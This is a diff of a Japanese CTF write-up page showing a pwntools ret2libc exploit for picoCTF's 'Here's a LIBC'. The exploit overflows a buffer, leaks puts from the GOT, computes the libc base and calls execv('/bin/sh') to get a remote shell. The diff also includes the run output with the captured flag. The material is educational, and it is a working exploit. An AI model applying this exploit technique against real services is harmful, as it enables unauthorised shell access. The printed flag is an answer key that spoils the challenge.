+<span class="n">s</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sc">&#39;\n&#39;</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>	</code></pre></td></tr></table>
+</div>
+</div>
+<p><br />
+ハイライト部分でretを入れているのは、おそらく16バイトアラインメントです。</p>
+<div class="admonition quote"><p class="admonition-title">quote</p>
+<p>ret命令を一度呼び出しスタックを8バイトずらせば、system関数を呼び出しても動作します。（Kusanoさんの「例題pwnable」より）</p>
+</div>
+<p><br /></p>
+<p>書いたコード (その２)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/env python</span>
+<span class="c1"># -*- coding:utf-8 -*-</span>
+
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;critical&#39;</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./vuln&#39;</span><span class="p">)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;mercury.picoctf.net&#39;</span><span class="p">,</span> <span class="mi">49464</span><span class="p">)</span>
+
+<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">.</span><span class="n">puts</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="o">.</span><span class="n">puts</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">.</span><span class="n">main</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">dump</span><span class="p">())</span>
+<span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;WeLcOmE To mY EcHo sErVeR!</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">136</span> <span class="o">+</span> <span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>
+<span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">puts</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="s1">&#39;puts: </span><span class="si">%x</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">puts</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>
+<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">puts</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="o">.</span><span class="n">puts</span>
+
+<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">.</span><span class="n">execv</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)),</span> <span class="mi">0</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">dump</span><span class="p">())</span>
+<span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;WeLcOmE To mY EcHo sErVeR!</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">136</span> <span class="o">+</span> <span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>
+<span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>	
+</code></pre></td></tr></table>
+</div>
+</div><p><br /></p>
+<p>動作結果：</p>
+<pre>
+$ ./heresalibc_solve.py
+0x7fa997cbb000
+$ ls
+flag.txt
+libc.so.6
+vuln
+vuln.c
+xinet_startup.sh
+$ cat flag.txt
+picoCTF{1_<3_sm4sh_st4cking_37b2dd6c2acb572a}
+</pre>
+<p><br /></p>
+<p>Flag: <code>picoCTF{1_&lt;3_sm4sh_st4cking_37b2dd6c2acb572a}</code></p>
+<p><br /></p>
+<p><br /><br />
 <br /><br /></p>
 <hr>
 <p><br /><br />
@@ -1794,6 +2286,7 @@ Hint: What version of python am I running?</p>
 <footer class="post-footer">
       <div class="post-tags">
           <a href="https://captureamerica.github.io/writeups/tags/ctf/">CTF</a>
+          <a href="https://captureamerica.github.io/writeups/tags/reviewed/">Reviewed</a>
           </div>
       <nav class="post-nav">
         <a class="prev" href="https://captureamerica.github.io/writeups/post/ritsec_ctf_2021/">
